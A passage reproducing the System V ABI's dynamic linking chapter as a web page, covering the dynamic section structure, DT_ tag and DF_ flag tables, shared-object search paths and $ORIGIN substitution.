<p>As &#39;&#39;Program Loading&#39;&#39; explains in the processor supplement, shared objects may occupy virtual memory addresses that are different from the addresses recorded in the file&#39;s program header table. The dynamic linker relocates the memory image, updating absolute addresses before the application gains control. Although the absolute address values would be correct if the library were loaded at the addresses specified in the program header table, this normally is not the case.</p>
<p>If the process environment [see <code>exec</code>(BA_OS)] contains a variable named <code>LD_BIND_NOW</code> with a non-null value, the dynamic linker processes all relocations before transferring control to the program. For example, all the following environment entries would specify this behavior.</p>
<ul>
<li>LD_BIND_NOW=1</li>
<li>LD_BIND_NOW=on</li>
<li>LD_BIND_NOW=off</li>
</ul>
<p>Otherwise, <code>LD_BIND_NOW</code> either does not occur in the environment or has a null value. The dynamic linker is permitted to evaluate procedure linkage table entries lazily, thus avoiding symbol resolution and relocation overhead for functions that are not called. See &#39;&#39;Procedure Linkage Table&#39;&#39; in this chapter of the processor supplement for more information.</p>
<h3 id="Dynamic-Section"><a href="#Dynamic-Section" class="headerlink" title="Dynamic Section"></a>Dynamic Section</h3><p>If an object file participates in dynamic linking, its program header table will have an element of type<code>PT_DYNAMIC</code>. This &#39;&#39;segment&#39;&#39; contains the <code>.dynamic</code> section. A special symbol, <code>_DYNAMIC</code>, labels the section, which contains an array of the following structures.</p>
<hr>
<p>Figure 5-9: Dynamic Structure</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">typedef struct &#123;</div><div class="line">	Elf32_Sword	d_tag;</div><div class="line">   	union &#123;</div><div class="line">   		Elf32_Word	d_val;</div><div class="line">   		Elf32_Addr	d_ptr;</div><div class="line">	&#125; d_un;</div><div class="line">&#125; Elf32_Dyn;</div><div class="line"></div><div class="line">extern Elf32_Dyn	_DYNAMIC[];</div><div class="line"></div><div class="line">typedef struct &#123;</div><div class="line">	Elf64_Sxword	d_tag;</div><div class="line">   	union &#123;</div><div class="line">   		Elf64_Xword	d_val;</div><div class="line">   		Elf64_Addr	d_ptr;</div><div class="line">	&#125; d_un;</div><div class="line">&#125; Elf64_Dyn;</div><div class="line"></div><div class="line">extern Elf64_Dyn	_DYNAMIC[];</div></pre></td></tr></table></figure>
<hr>
<p>For each object with this type, <code>d_tag</code> controls the interpretation of <code>d_un</code>.</p>
<ul>
<li><p><code>d_val</code></p>
<p>These objects represent integer values with various interpretations.</p>
</li>
<li><p><code>d_ptr</code></p>
<p>These objects represent program virtual addresses. As mentioned previously, a file&#39;s virtual addresses might not match the memory virtual addresses during execution. When interpreting addresses contained in the dynamic structure, the dynamic linker computes actual addresses, based on the original file value and the memory base address. For consistency, files do <em>not</em> contain relocation  entries to &quot; correct&#39;&#39; addresses in the dynamic structure.   </p>
</li>
</ul>
<p>To make it simpler for tools to interpret the contents of dynamic section entries, the value of each tag, except for those in two special compatibility ranges, will determine the interpretation of the <code>d_un</code> union. A tag whose value is an even number indicates a dynamic section entry that uses <code>d_ptr</code>. <strong>A tag whose value is an odd number indicates a dynamic section entry that uses <code>d_val</code> or that uses neither <code>d_ptr</code> nor <code>d_val</code></strong>. Tags whose values are less than the special value <code>DT_ENCODING</code> and tags whose values fall between <code>DT_HIOS</code> and <code>DT_LOPROC</code> do not follow these rules.</p>
<p>The following table summarizes the tag requirements for executable and shared object files. If a tag is marked &quot;mandatory&#39;&#39;, the dynamic linking array for an ABI-conforming file must have an entry of that type. Likewise, &quot;optional&#39;&#39; means an entry for the tag may appear but is not required.</p>
<hr>
<p>Figure 5-10: Dynamic Array Tags <code>d_tag</code></p>
<table>
<thead>
<tr>
<th><strong>Name</strong></th>
<th><strong>Value</strong></th>
<th><code>d_un</code></th>
<th><strong>Executable</strong></th>
<th><strong>Shared Object</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>DT_NULL</code></td>
<td><code>0</code></td>
<td>ignored</td>
<td>mandatory</td>
<td>mandatory</td>
</tr>
<tr>
<td><code>DT_NEEDED</code></td>
<td><code>1</code></td>
<td><code>d_val</code></td>
<td>optional</td>
<td>optional</td>
</tr>
<tr>
<td><code>DT_PLTRELSZ</code></td>
<td><code>2</code></td>
<td><code>d_val</code></td>
<td>optional</td>
<td>optional</td>
</tr>
<tr>
<td><code>DT_PLTGOT</code></td>
<td><code>3</code></td>
<td><code>d_ptr</code></td>
<td>optional</td>
<td>optional</td>
</tr>
<tr>
<td><code>DT_HASH</code></td>
<td><code>4</code></td>
<td><code>d_ptr</code></td>
<td>mandatory</td>
<td>mandatory</td>
</tr>
<tr>
<td><code>DT_STRTAB</code></td>
<td><code>5</code></td>
<td><code>d_ptr</code></td>
<td>mandatory</td>
<td>mandatory</td>
</tr>
<tr>
<td><code>DT_SYMTAB</code></td>
<td><code>6</code></td>
<td><code>d_ptr</code></td>
<td>mandatory</td>
<td>mandatory</td>
</tr>
<tr>
<td><code>DT_RELA</code></td>
<td><code>7</code></td>
<td><code>d_ptr</code></td>
<td>mandatory</td>
<td>optional</td>
</tr>
<tr>
<td><code>DT_RELASZ</code></td>
<td><code>8</code></td>
<td><code>d_val</code></td>
<td>mandatory</td>
<td>optional</td>
</tr>
<tr>
<td><code>DT_RELAENT</code></td>
<td><code>9</code></td>
<td><code>d_val</code></td>
<td>mandatory</td>
<td>optional</td>
</tr>
<tr>
<td><code>DT_STRSZ</code></td>
<td><code>10</code></td>
<td><code>d_val</code></td>
<td>mandatory</td>
<td>mandatory</td>
</tr>
<tr>
<td><code>DT_SYMENT</code></td>
<td><code>11</code></td>
<td><code>d_val</code></td>
<td>mandatory</td>
<td>mandatory</td>
</tr>
<tr>
<td><code>DT_INIT</code></td>
<td><code>12</code></td>
<td><code>d_ptr</code></td>
<td>optional</td>
<td>optional</td>
</tr>
<tr>
<td><code>DT_FINI</code></td>
<td><code>13</code></td>
<td><code>d_ptr</code></td>
<td>optional</td>
<td>optional</td>
</tr>
<tr>
<td><code>DT_SONAME</code></td>
<td><code>14</code></td>
<td><code>d_val</code></td>
<td>ignored</td>
<td>optional</td>
</tr>
<tr>
<td><code>DT_RPATH*</code></td>
<td><code>15</code></td>
<td><code>d_val</code></td>
<td>optional</td>
<td>ignored</td>
</tr>
<tr>
<td><code>DT_SYMBOLIC*</code></td>
<td><code>16</code></td>
<td>ignored</td>
<td>ignored</td>
<td>optional</td>
</tr>
<tr>
<td><code>DT_REL</code></td>
<td><code>17</code></td>
<td><code>d_ptr</code></td>
<td>mandatory</td>
<td>optional</td>
</tr>
<tr>
<td><code>DT_RELSZ</code></td>
<td><code>18</code></td>
<td><code>d_val</code></td>
<td>mandatory</td>
<td>optional</td>
</tr>
<tr>
<td><code>DT_RELENT</code></td>
<td><code>19</code></td>
<td><code>d_val</code></td>
<td>mandatory</td>
<td>optional</td>
</tr>
<tr>
<td><code>DT_PLTREL</code></td>
<td><code>20</code></td>
<td><code>d_val</code></td>
<td>optional</td>
<td>optional</td>
</tr>
<tr>
<td><code>DT_DEBUG</code></td>
<td><code>21</code></td>
<td><code>d_ptr</code></td>
<td>optional</td>
<td>ignored</td>
</tr>
<tr>
<td><code>DT_TEXTREL*</code></td>
<td><code>22</code></td>
<td>ignored</td>
<td>optional</td>
<td>optional</td>
</tr>
<tr>
<td><code>DT_JMPREL</code></td>
<td><code>23</code></td>
<td><code>d_ptr</code></td>
<td>optional</td>
<td>optional</td>
</tr>
<tr>
<td><code>DT_BIND_NOW*</code></td>
<td><code>24</code></td>
<td>ignored</td>
<td>optional</td>
<td>optional</td>
</tr>
<tr>
<td><code>DT_INIT_ARRAY</code></td>
<td><code>25</code></td>
<td><code>d_ptr</code></td>
<td>optional</td>
<td>optional</td>
</tr>
<tr>
<td><code>DT_FINI_ARRAY</code></td>
<td><code>26</code></td>
<td><code>d_ptr</code></td>
<td>optional</td>
<td>optional</td>
</tr>
<tr>
<td><code>DT_INIT_ARRAYSZ</code></td>
<td><code>27</code></td>
<td><code>d_val</code></td>
<td>optional</td>
<td>optional</td>
</tr>
<tr>
<td><code>DT_FINI_ARRAYSZ</code></td>
<td><code>28</code></td>
<td><code>d_val</code></td>
<td>optional</td>
<td>optional</td>
</tr>
<tr>
<td><code>DT_RUNPATH</code></td>
<td><code>29</code></td>
<td><code>d_val</code></td>
<td>optional</td>
<td>optional</td>
</tr>
<tr>
<td><code>DT_FLAGS</code></td>
<td><code>30</code></td>
<td><code>d_val</code></td>
<td>optional</td>
<td>optional</td>
</tr>
<tr>
<td><code>DT_ENCODING</code></td>
<td><code>32</code></td>
<td>unspecified</td>
<td>unspecified</td>
<td>unspecified</td>
</tr>
<tr>
<td><code>DT_PREINIT_ARRAY</code></td>
<td><code>32</code></td>
<td><code>d_ptr</code></td>
<td>optional</td>
<td>ignored</td>
</tr>
<tr>
<td><code>DT_PREINIT_ARRAYSZ</code></td>
<td><code>33</code></td>
<td><code>d_val</code></td>
<td>optional</td>
<td>ignored</td>
</tr>
<tr>
<td><code>DT_SYMTAB_SHNDX</code></td>
<td><code>34</code></td>
<td><code>d_ptr</code></td>
<td>optional</td>
<td>optional</td>
</tr>
<tr>
<td><code>DT_LOOS</code></td>
<td><code>0x6000000D</code></td>
<td>unspecified</td>
<td>unspecified</td>
<td>unspecified</td>
</tr>
<tr>
<td><code>DT_HIOS</code></td>
<td><code>0x6ffff000</code></td>
<td>unspecified</td>
<td>unspecified</td>
<td>unspecified</td>
</tr>
<tr>
<td><code>DT_LOPROC</code></td>
<td><code>0x70000000</code></td>
<td>unspecified</td>
<td>unspecified</td>
<td>unspecified</td>
</tr>
<tr>
<td><code>DT_HIPROC</code></td>
<td><code>0x7fffffff</code></td>
<td>unspecified</td>
<td>unspecified</td>
<td>unspecified</td>
</tr>
</tbody>
</table>
<p>* Signifies an entry that is at level 2.</p>
<hr>
<ul>
<li><p><code>DT_NULL</code></p>
<p>An entry with a <code>DT_NULL</code> tag marks the end of the <code>_DYNAMIC</code> array.</p>
</li>
<li><p><code>DT_NEEDED</code></p>
<p>This element holds the string table offset of a null-terminated string, giving the name of a needed library. The offset is an index into the table recorded in the <code>DT_STRTAB</code> code. See <a href="http://www.sco.com/developers/gabi/latest/ch5.dynamic.html#shobj_dependencies" target="_blank" rel="external">&quot;Shared Object Dependencies&#39;&#39;</a> for more information about these names. The dynamic array may contain multiple entries with this type. These entries&#39; relative order is significant, though their relation to entries of other types is not.</p>
</li>
<li><p><code>DT_PLTRELSZ</code></p>
<p>This element holds the total size, in bytes, of the relocation entries associated with the procedure linkage table. If an entry of type <code>DT_JMPREL</code> is present, a <code>DT_PLTRELSZ</code> must accompany it.</p>
</li>
<li><p><code>DT_PLTGOT</code></p>
<p>This element holds an address associated with the procedure linkage table and/or the global offset table. See this section in the processor supplement for details.</p>
</li>
<li><p><code>DT_HASH</code></p>
<p>This element holds the address of the symbol hash table, described in <a href="http://www.sco.com/developers/gabi/latest/ch5.dynamic.html#hash" target="_blank" rel="external">&quot;Hash Table&#39;&#39;</a>. This hash table refers to the symbol table referenced by the <code>DT_SYMTAB</code> element.</p>
</li>
<li><p><code>DT_STRTAB</code></p>
<p>This element holds the address of the string table, described in Chapter 4. Symbol names, library names, and other strings reside in this table.</p>
</li>
<li><p><code>DT_SYMTAB</code></p>
<p>This element holds the address of the symbol table, described in the first part of this chapter, with <code>Elf32_Sym</code> entries for the 32-bit class of files and <code>Elf64_Sym</code> entries for the 64-bit class of files.</p>
</li>
<li><p><code>DT_RELA</code></p>
<p>This element holds the address of a relocation table, described in Chapter 4. Entries in the table have explicit addends, such as <code>Elf32_Rela</code> for the 32-bit file class or <code>Elf64_Rela</code> for the 64-bit file class. An object file may have multiple relocation sections. When building the relocation table for an executable or shared object file, the link editor catenates those sections to form a single table. Although the sections remain independent in the object file, the dynamic linker sees a single table. When the dynamic linker creates the process image for an executable file or adds a shared object to the process image, it reads the relocation table and performs the associated actions. If this element is present, the dynamic structure must also have <code>DT_RELASZ</code> and <code>DT_RELAENT</code> elements. When relocation is “mandatory&#39;&#39; for a file, either <code>DT_RELA</code> or <code>DT_REL</code> may occur (both are permitted but not required).</p>
</li>
<li><p><code>DT_RELASZ</code></p>
<p>This element holds the total size, in bytes, of the <code>DT_RELA</code> relocation table.</p>
</li>
<li><p><code>DT_RELAENT</code></p>
<p>This element holds the size, in bytes, of the <code>DT_RELA</code> relocation entry.</p>
</li>
<li><p><code>DT_STRSZ</code></p>
<p>This element holds the size, in bytes, of the string table.</p>
</li>
<li><p><code>DT_SYMENT</code></p>
<p>This element holds the size, in bytes, of a symbol table entry.</p>
</li>
<li><p><code>DT_INIT</code></p>
<p>This element holds the address of the initialization function, discussed in <a href="http://www.sco.com/developers/gabi/latest/ch5.dynamic.html#init_fini" target="_blank" rel="external">“Initialization and Termination Functions&#39;&#39;</a> below.</p>
</li>
<li><p><code>DT_FINI</code></p>
<p>This element holds the address of the termination function, discussed in <a href="http://www.sco.com/developers/gabi/latest/ch5.dynamic.html#init_fini" target="_blank" rel="external">“Initialization and Termination Functions&#39;&#39;</a> below. </p>
</li>
<li><p><code>DT_SONAME</code></p>
<p>This element holds the string table offset of a null-terminated string, giving the name of the shared object. The offset is an index into the table recorded in the <code>DT_STRTAB</code> entry. See <a href="http://www.sco.com/developers/gabi/latest/ch5.dynamic.html#shobj_dependencies" target="_blank" rel="external">“Shared Object Dependencies&#39;&#39;</a> below for more information about these names. </p>
</li>
<li><p><code>DT_RPATH</code></p>
<p>This element holds the string table offset of a null-terminated search library search path string discussed in <a href="http://www.sco.com/developers/gabi/latest/ch5.dynamic.html#shobj_dependencies" target="_blank" rel="external">”Shared Object Dependencies&#39;&#39;</a>. The offset is an index into the table recorded in the <code>DT_STRTAB</code> entry. This entry is at level 2. Its use has been superseded by <a href="http://www.sco.com/developers/gabi/latest/ch5.dynamic.html#dt_runpath" target="_blank" rel="external"><code>DT_RUNPATH</code></a>. </p>
</li>
<li><p><code>DT_SYMBOLIC</code></p>
<p>This element&#39;s presence in a shared object library alters the dynamic linker&#39;s symbol resolution algorithm for references within the library. Instead of starting a symbol search with the executable file, the dynamic linker starts from the shared object itself. If the shared object fails to supply the referenced symbol, the dynamic linker then searches the executable file and other shared objects as usual. This entry is at level 2. Its use has been superseded by the <a href="http://www.sco.com/developers/gabi/latest/ch5.dynamic.html#df_symbolic" target="_blank" rel="external"><code>DF_SYMBOLIC</code></a> flag.</p>
</li>
<li><p><code>DT_REL</code></p>
<p>This element is similar to <code>DT_RELA</code>, except its table has implicit addends, such as <code>Elf32_Rel</code> for the 32-bit file class or <code>Elf64_Rel</code> for the 64-bit file class. If this element is present, the dynamic structure must also have<code>DT_RELSZ</code> and <code>DT_RELENT</code> elements.</p>
</li>
<li><p><code>DT_RELSZ</code></p>
<p>This element holds the total size, in bytes, of the <code>DT_REL</code> relocation table.</p>
</li>
<li><p><code>DT_RELENT</code></p>
<p>This element holds the size, in bytes, of the <code>DT_REL</code> relocation entry.</p>
</li>
<li><p><code>DT_PLTREL</code></p>
<p>This member specifies the type of relocation entry to which the procedure linkage table refers. The <code>d_val</code>member holds <code>DT_REL</code> or <code>DT_RELA</code>, as appropriate. All relocations in a procedure linkage table must use the same relocation.</p>
</li>
<li><p><code>DT_DEBUG</code></p>
<p>This member is used for debugging. Its contents are not specified for the ABI; programs that access this entry are not ABI-conforming.</p>
</li>
<li><p><code>DT_TEXTREL</code></p>
<p>This member&#39;s absence signifies that no relocation entry should cause a modification to a non-writable segment, as specified by the segment permissions in the program header table. If this member is present, one or more relocation entries might request modifications to a non-writable segment, and the dynamic linker can prepare accordingly. This entry is at level 2. Its use has been superseded by the <a href="http://www.sco.com/developers/gabi/latest/ch5.dynamic.html#df_textrel" target="_blank" rel="external"><code>DF_TEXTREL</code></a> flag.</p>
</li>
<li><p><code>DT_JMPREL</code></p>
<p>If present, this entry&#39;s <code>d_ptr</code> member holds the address of relocation entries associated solely with the procedure linkage table. Separating these relocation entries lets the dynamic linker ignore them during process initialization, if lazy binding is enabled. If this entry is present, the related entries of types<code>DT_PLTRELSZ</code> and <code>DT_PLTREL</code> must also be present.</p>
</li>
<li><p><code>DT_BIND_NOW</code></p>
<p>If present in a shared object or executable, this entry instructs the dynamic linker to process all relocations for the object containing this entry before transferring control to the program. The presence of this entry takes precedence over a directive to use lazy binding for this object when specified through the environment or via <code>dlopen</code>(BA_LIB). This entry is at level 2. Its use has been superseded by the <a href="http://www.sco.com/developers/gabi/latest/ch5.dynamic.html#df_bind_now" target="_blank" rel="external"><code>DF_BIND_NOW</code></a> flag.</p>
</li>
<li><p><code>DT_INIT_ARRAY</code></p>
<p>This element holds the address of the array of pointers to initialization functions, discussed in<a href="http://www.sco.com/developers/gabi/latest/ch5.dynamic.html#init_fini" target="_blank" rel="external"><code></code>Initialization and Termination Functions&#39;&#39;</a> below.</p>
</li>
<li><p><code>DT_FINI_ARRAY</code></p>
<p>This element holds the address of the array of pointers to termination functions, discussed in<a href="http://www.sco.com/developers/gabi/latest/ch5.dynamic.html#init_fini" target="_blank" rel="external"><code></code>Initialization and Termination Functions&#39;&#39;</a> below.</p>
</li>
<li><p><code>DT_INIT_ARRAYSZ</code></p>
<p>This element holds the size in bytes of the array of initialization functions pointed to by the <code>DT_INIT_ARRAY</code>entry. If an object has a <code>DT_INIT_ARRAY</code> entry, it must also have a <code>DT_INIT_ARRAYSZ</code> entry.</p>
</li>
<li><p><code>DT_FINI_ARRAYSZ</code></p>
<p>This element holds the size in bytes of the array of termination functions pointed to by the <code>DT_FINI_ARRAY</code>entry. If an object has a <code>DT_FINI_ARRAY</code> entry, it must also have a <code>DT_FINI_ARRAYSZ</code> entry.</p>
</li>
<li><p><code>DT_RUNPATH</code></p>
<p>This element holds the string table offset of a null-terminated library search path string discussed in <a href="http://www.sco.com/developers/gabi/latest/ch5.dynamic.html#shobj_dependencies" target="_blank" rel="external">”Shared Object Dependencies&#39;&#39;</a>. The offset is an index into the table recorded in the <code>DT_STRTAB</code> entry.</p>
</li>
<li><p><code>DT_FLAGS</code></p>
<p>This element holds flag values specific to the object being loaded. Each flag value will have the name <code>DF_</code><em>flag_name</em>. Defined values and their meanings are described <a href="http://www.sco.com/developers/gabi/latest/ch5.dynamic.html#df_flags" target="_blank" rel="external">below</a>. All other values are reserved.</p>
</li>
<li><p><code>DT_PREINIT_ARRAY</code></p>
<p>This element holds the address of the array of pointers to pre-initialization functions, discussed in <a href="http://www.sco.com/developers/gabi/latest/ch5.dynamic.html#init_fini" target="_blank" rel="external">“Initialization and Termination Functions&#39;&#39;</a> below. The <code>DT_PREINIT_ARRAY</code> table is processed only in an executable file; it is ignored if contained in a shared object. </p>
</li>
<li><p><code>DT_PREINIT_ARRAYSZ</code></p>
<p>This element holds the size in bytes of the array of pre-initialization functions pointed to by the <code>DT_PREINIT_ARRAY</code> entry. If an object has a <code>DT_PREINIT_ARRAY</code> entry, it must also have a <code>DT_PREINIT_ARRAYSZ</code> entry. As with <code>DT_PREINIT_ARRAY</code>, this entry is ignored if it appears in a shared object.</p>
</li>
<li><p><code>DT_SYMTAB_SHNDX</code></p>
<p>This element holds the address of the <code>SHT_SYMTAB_SHNDX</code> section associated with the dynamic symbol table referenced by the <code>DT_SYMTAB</code> element.</p>
</li>
<li><p><code>DT_ENCODING</code></p>
<p>Values greater than or equal to <code>DT_ENCODING</code> and less than <code>DT_LOOS</code> follow the rules for the interpretation of the <code>d_un</code> union described <a href="http://www.sco.com/developers/gabi/latest/ch5.dynamic.html#tag_encodings" target="_blank" rel="external">above</a>.</p>
</li>
<li><p><code>DT_LOOS</code> through <code>DT_HIOS</code></p>
<p>Values in this inclusive range are reserved for operating system-specific semantics. All such values follow the rules for the interpretation of the <code>d_un</code> union described <a href="http://www.sco.com/developers/gabi/latest/ch5.dynamic.html#tag_encodings" target="_blank" rel="external">above</a>.</p>
</li>
<li><p><code>DT_LOPROC</code> through <code>DT_HIPROC</code></p>
<p>Values in this inclusive range are reserved for processor-specific semantics. If meanings are specified, the processor supplement explains them. All such values follow the rules for the interpretation of the <code>d_un</code>union described <a href="http://www.sco.com/developers/gabi/latest/ch5.dynamic.html#tag_encodings" target="_blank" rel="external">above</a>.</p>
</li>
</ul>
<p>Except for the <code>DT_NULL</code> element at the end of the array, and the relative order of <code>DT_NEEDED</code> elements, entries may appear in any order. Tag values not appearing in the table are reserved.</p>
<hr>
<p>Figure 5-11: <code>DT_FLAGS</code> values</p>
<table>
<thead>
<tr>
<th><strong>Name</strong></th>
<th><strong>Value</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>DF_ORIGIN</code></td>
<td><code>0x1</code></td>
</tr>
<tr>
<td><code>DF_SYMBOLIC</code></td>
<td><code>0x2</code></td>
</tr>
<tr>
<td><code>DF_TEXTREL</code></td>
<td><code>0x4</code></td>
</tr>
<tr>
<td><code>DF_BIND_NOW</code></td>
<td><code>0x8</code></td>
</tr>
<tr>
<td><code>DF_STATIC_TLS</code></td>
<td><code>0x10</code></td>
</tr>
</tbody>
</table>
<hr>
<ul>
<li><p><code>DF_ORIGIN</code></p>
<p>This flag signifies that the object being loaded may make reference to the <code>$ORIGIN</code> substitution string (see <a href="http://www.sco.com/developers/gabi/latest/ch5.dynamic.html#substitution" target="_blank" rel="external">&quot;Substitution Sequences&#39;&#39;</a>). The dynamic linker must determine the pathname of the object containing this entry when the object is loaded. </p>
</li>
<li><p><code>DF_SYMBOLIC</code></p>
<p>If this flag is set in a shared object library, the dynamic linker&#39;s symbol resolution algorithm for references within the library is changed. Instead of starting a symbol search with the executable file, the dynamic linker starts from the shared object itself. If the shared object fails to supply the referenced symbol, the dynamic linker then searches the executable file and other shared objects as usual.</p>
</li>
<li><p><code>DF_TEXTREL</code></p>
<p>If this flag is not set, no relocation entry should cause a modification to a non-writable segment, as specified by the segment permissions in the program header table. If this flag is set, one or more relocation entries might request modifications to a non-writable segment, and the dynamic linker can prepare accordingly.</p>
</li>
<li><p><code>DF_BIND_NOW</code></p>
<p>If set in a shared object or executable, this flag instructs the dynamic linker to process all relocations for the object containing this entry before transferring control to the program. The presence of this entry takes precedence over a directive to use lazy binding for this object when specified through the environment or via <code>dlopen</code>(BA_LIB).</p>
</li>
<li><p><code>DF_STATIC_TLS</code></p>
<p>If set in a shared object or executable, this flag instructs the dynamic linker to reject attempts to load this file dynamically. It indicates that the shared object or executable contains code using a <em>static thread-local storage</em> scheme. Implementations need not support any form of thread-local storage.</p>
</li>
</ul>
<h3 id="Shared-Object-Dependencies"><a href="#Shared-Object-Dependencies" class="headerlink" title="Shared Object Dependencies"></a>Shared Object Dependencies</h3><p>When the link editor processes an archive library, it extracts library members and copies them into the output object file. These statically linked services are available during execution without involving the dynamic linker. Shared objects also provide services, and the dynamic linker must attach the proper shared object files to the process image for execution.</p>
<p>When the dynamic linker creates the memory segments for an object file, the dependencies (recorded in<code>DT_NEEDED</code> entries of the dynamic structure) tell what shared objects are needed to supply the program&#39;s services. By repeatedly connecting referenced shared objects and their dependencies, the dynamic linker builds a complete process image. When resolving symbolic references, the dynamic linker examines the symbol tables with a breadth-first search. That is, it first looks at the symbol table of the executable program itself, then at the symbol tables of the <code>DT_NEEDED</code> entries (in order), and then at the second level <code>DT_NEEDED</code> entries, and so on. Shared object files must be readable by the process; other permissions are not required.</p>
<hr>
<p> Even when a shared object is referenced multiple times in the dependency list, the dynamic linker will connect the object only once to the process.</p>
<hr>
<p>Names in the dependency list are copies either of the <code>DT_SONAME</code> strings or the path names of the shared objects used to build the object file. For example, if the link editor builds an executable file using one shared object with a <code>DT_SONAME</code> entry of <code>lib1</code> and another shared object library with the path name <code>/usr/lib/lib2</code>, the executable file will contain <code>lib1</code> and <code>/usr/lib/lib2</code> in its dependency list.</p>
<p>If a shared object name has one or more slash (<code>/</code>) characters anywhere in the name, such as <code>/usr/lib/lib2</code> or <code>directory/file</code>, the dynamic linker uses that string directly as the path name. If the name has no slashes, such as <code>lib1</code>, three facilities specify shared object path searching.</p>
<hr>
<ul>
<li><ul>
<li><p>The dynamic array tag DT_RUNPATH gives a string that holds a list of directories, separated by colons (:). For example, the string <code>/home/dir/lib:/home/dir2/lib:</code> tells the dynamic linker to search first the directory <code>/home/dir/lib</code> , then <code>/home/dir2/lib</code>, and then the current directory to find dependencies.</p>
<p>The set of directories specified by a given <code>DT_RUNPATH</code> entry is used to find only the immediate dependencies of the executable or shared object containing the <code>DT_RUNPATH</code> entry. That is, it is used only for those dependencies contained in the <code>DT_NEEDED</code> entries of the dynamic structure containing the <code>DT_RUNPATH</code> entry, itself. One object&#39;s <code>DT_RUNPATH</code> entry does not affect the search for any other object&#39;s dependencies.</p>
</li>
<li><p>A variable called  <code>LD_LIBRARY_PATH</code>in the process environment [see exec(BA_OS)] may hold a list of directories as above, optionally followed by a semicolon (;) and another directory list. The following values would be equivalent to the previous example:</p>
<ul>
<li><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">LD_LIBRARY_PATH=/home/dir/usr/lib:/home/dir2/usr/lib:</div></pre></td></tr></table></figure>
</li>
<li><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">LD_LIBRARY_PATH=/home/dir/usr/lib;/home/dir2/usr/lib:</div></pre></td></tr></table></figure>
</li>
<li><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">LD_LIBRARY_PATH=/home/dir/usr/lib:/home/dir2/usr/lib:;</div></pre></td></tr></table></figure>
</li>
</ul>
<p>Although some programs (such as the link editor) treat the lists before and after the semicolon differently, the dynamic linker does not. Nevertheless, the dynamic linker accepts the semicolon notation, with the semantics described previously.</p>
<p>All <code>LD_LIBRARY_PATH</code> directories are searched before those from <code>DT_RUNPATH</code>.</p>
</li>
<li><p>Finally, if the other two groups of directories fail to locate the desired library, the dynamic linker searches the default directories, <code>/usr/lib</code> or such other directories as may be specified by the ABI supplement for a given processor.</p>
</li>
</ul>
</li>
</ul>
<hr>
<ul>
<li>When the dynamic linker is searching for shared objects, it is not a fatal error if an ELF file with the wrong attributes is encountered in the search. Instead, the dynamic linker shall exhaust the search of all paths before determining that a matching object could not be found. For this determination, the relevant attributes are contained in the following ELF header fields: <code>e_ident[EI_DATA]</code>, <code>e_ident[EI_CLASS]</code>,<code>e_ident[EI_OSABI]</code>, <code>e_ident[EI_ABIVERSION]</code>, <code>e_machine</code>, <code>e_type</code>, <code>e_flags</code> and <code>e_version</code>.</li>
</ul>
<hr>
<ul>
<li>For security, the dynamic linker ignores <code>LD_LIBRARY_PATH</code> for set-user and set-group ID programs. It does, however, search <code>DT_RUNPATH</code>  directories and the default directories. The same restriction may be applied to processes that have more than minimal privileges on systems with installed extended security mechanisms.</li>
</ul>
<hr>
<ul>
<li><p>A fourth search facility, the dynamic array tag  <code>DT_RPATH</code>, has been moved to level 2 in the ABI. It provides a colon-separated list of directories to search. Directories specified by <code>DT_RPATH</code> are searched before directories specified by <code>LD_LIBRARY_PATH</code></p>
</li>
<li><p>If both <code>DT_RPATH</code> and <code>DT_RUNPATH</code> entries appear in a single object&#39;s dynamic array, the dynamic linker processes only the <code>DT_RUNPATH</code> entry.</p>
</li>
</ul>
<hr>
<ul>
<li><h3 id="Substitution-Sequences"><a href="#Substitution-Sequences" class="headerlink" title="Substitution Sequences"></a>Substitution Sequences</h3></li>
<li><p>Within a string provided by dynamic array entries with the <code>DT_NEEDED</code> or <code>DT_RUNPATH</code> tags and in pathnames passed as parameters to the <code>dlopen()</code> routine, a dollar sign ($) introduces a substitution sequence. This sequence consists of the dollar sign immediately followed by either the longest name sequence or a name contained within left and right braces ({) and (}). A name is a sequence of bytes that start with either a letter or an underscore followed by zero or more letters, digits or underscores. If a dollar sign is not immediately followed by a name or a brace-enclosed name, the behavior of the dynamic linker is unspecified.</p>
</li>
<li><p>If the name is ”ORIGIN“, then the substitution sequence is replaced by the dynamic linker with the absolute pathname of the directory in which the object containing the substitution sequence originated. Moreover, the pathname will contain no symbolic links or use of  ”.&quot; or &quot;..&quot; components. Otherwise (when the name is not &quot;<code>ORIGIN</code>&#39;&#39;) the behavior of the dynamic linker is unspecified.</p>
</li>
<li><p>When the dynamic linker loads an object that uses <code>$ORIGIN</code>, it must calculate the pathname of the directory containing the object. Because this calculation can be computationally expensive, implementations may want to avoid the calculation for objects that do not use <code>$ORIGIN</code>. If an object calls <code>dlopen()</code> with a string containing <code>$ORIGIN</code> and does not use <code>$ORIGIN</code> in one if its dynamic array entries, the dynamic linker may not have calculated the pathname for the object until the <code>dlopen()</code> actually occurs. Since the application may have changed its current working directory before the <code>dlopen()</code> call, the calculation may not yield the correct result. To avoid this possibility, an object may signal its intention to reference <code>$ORIGIN</code> by setting the <a href="http://www.sco.com/developers/gabi/latest/ch5.dynamic.html#df_flags" target="_blank" rel="external"><code>DF_ORIGIN</code> flag</a>. An implementation may reject an attempt to use <code>$ORIGIN</code>within a <code>dlopen()</code> call from an object that did not set the <code>DF_ORIGIN</code> flag and did not use <code>$ORIGIN</code> within its dynamic array.</p>
</li>
</ul>
<hr>
<ul>
